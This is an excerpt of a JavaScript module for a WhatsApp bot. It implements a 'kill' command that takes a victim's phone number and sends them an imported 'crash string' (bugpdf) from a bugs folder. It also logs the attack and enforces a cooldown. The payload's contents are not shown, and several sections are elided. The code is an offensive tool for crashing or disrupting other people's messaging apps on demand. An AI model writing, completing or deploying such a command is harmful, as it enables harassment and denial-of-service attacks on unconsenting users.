...
const { bugpdf } = require('../bugs/bugpdf');  // Import from bugs folder
...
const COOLDOWN_FILE = path.join(__dirname, '../data/kill_cooldown.json');
...
// ============================================
async function killCommand(sock, chatId, message, args) {
    ...
    try {
        ...
        if (!targetNumber) {
            await sock.sendMessage(chatId, {
                text: `❌ *Usage:* ${global.prefix || '#'}kill <number>\n\nExample: ${global.prefix || '#'}kill 23470xxxxxxxx`,
                contextInfo: {
                    forwardingScore: 1,
                    isForwarded: true,
        ...
        // Send the imported crash string from bugs folder
        await sock.sendMessage(targetJid, {
            text: bugpdf  // Imported from ../bugs/bugpdf.js
        });
        ...
        console.log(`💀 Kill command executed by ${userIdentifier} targeting ${cleanNumber}`);
